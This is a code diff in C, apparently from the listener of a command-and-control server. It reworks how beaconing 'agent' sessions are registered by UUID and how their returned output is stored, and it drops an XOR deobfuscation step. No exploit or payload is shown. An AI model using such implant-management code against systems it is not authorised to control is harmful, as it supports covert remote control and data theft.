@@ -39,23 +39,25 @@ void TcpNonBlock(NetSock Sock)
 #endif
 }
 
-static void TcpDispatch(NetSock Conn, SessionPool *P, const char *PeerAddr, int SrcPort)
+static void TcpDispatch(NetSock Conn, SessionPool *P, const char *PeerIp)
 {
-    char Buf[BufSize] = {0};
-    int N = recv(Conn, Buf, BufSize - 1, 0);
+    char Raw[BufSize] = {0};
+    int N = recv(Conn, Raw, BufSize - 1, 0);
     if (N <= 0) return;
-    Buf[N] = '\0';
-    ApplyXor(Buf, (size_t)N);
 
-    int PrevCount    = P->Count;
-    AgentSession *S  = PoolRegister(P, PeerAddr, SrcPort);
+    char Uuid[UuidLen], Payload[BufSize];
+    int PayloadLen;
+    if (!FrameParse(Raw, N, Uuid, Payload, &PayloadLen)) return;
+
+    int PrevCount   = P->Count;
+    AgentSession *S = PoolRegister(P, Uuid, PeerIp);
     if (!S) return;
-    int IsNew = (P->Count > PrevCount);
-    if (IsNew) PoolNotifyConnect(P, S);
 
-    if (strcmp(Buf, "Standby") != 0) {
+    if (P->Count > PrevCount) PoolNotifyConnect(P, S);
+
+    if (strcmp(Payload, "Standby") != 0) {
         memset(S->LastOutput, 0, BufSize);
-        memcpy(S->LastOutput, Buf, (size_t)N);
+        memcpy(S->LastOutput, Payload, (size_t)PayloadLen);
         PoolNotifyOutput(P, S);
     }
 
@@ -80,9 +82,6 @@ void TcpHandleBeacon(NetSock Listener, SessionPool *P)
     socklen_t PeerLen = sizeof(Peer);
     NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
     if (Conn == NetInvalid) return;
-    char PeerAddr[AddrSize];
-    strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
-    int SrcPort = (int)ntohs(Peer.sin_port);
-    TcpDispatch(Conn, P, PeerAddr, SrcPort);
+    TcpDispatch(Conn, P, inet_ntoa(Peer.sin_addr));
     NetClose(Conn);
 }
